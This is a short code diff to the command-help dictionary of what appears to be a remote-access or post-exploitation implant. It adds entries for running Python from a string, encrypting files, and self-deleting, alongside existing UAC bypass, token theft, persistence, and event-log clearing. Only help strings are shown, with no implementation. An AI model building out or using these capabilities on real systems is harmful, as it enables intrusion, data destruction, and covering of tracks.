@@ -28,6 +28,7 @@ commands = {'help': ['Show this help'],
             'pkill': ['Terminate a running process'],
             'run': ['Create a process without waiting for termination'],
             'hiderun': ['Create a process in hidden mode'],
+            'pyexec': ['Execute Python code from string'],
             'persistence': ['Apply persistence mechanism'],
             'bypassuac': ['Elevate as administrator without UAC prompt'],
             'stealtoken': ['Duplicate access token from a running process'],
@@ -52,10 +53,13 @@ commands = {'help': ['Show this help'],
             'setclip': ['Copy text to clipboard'],
             'filewatch': ['Monitor a directory tree for changes'],
             'procmon': ['Monitor specific process creation'],
+            'encrypt': ['Encrypt files'],
+            'decrypt': ['Decrypt files'],
             'freeze': ['Block keyboard and mouse input'],
             'openurl': ['Open a url in web browser'],
             'wallpaper': ['Change desktop background'],
-            'clearlog': ['Clear event logs']
+            'clearlog': ['Clear event logs'],
+            'cleanup': ['Remove persistence and self delete']
             }
 
 
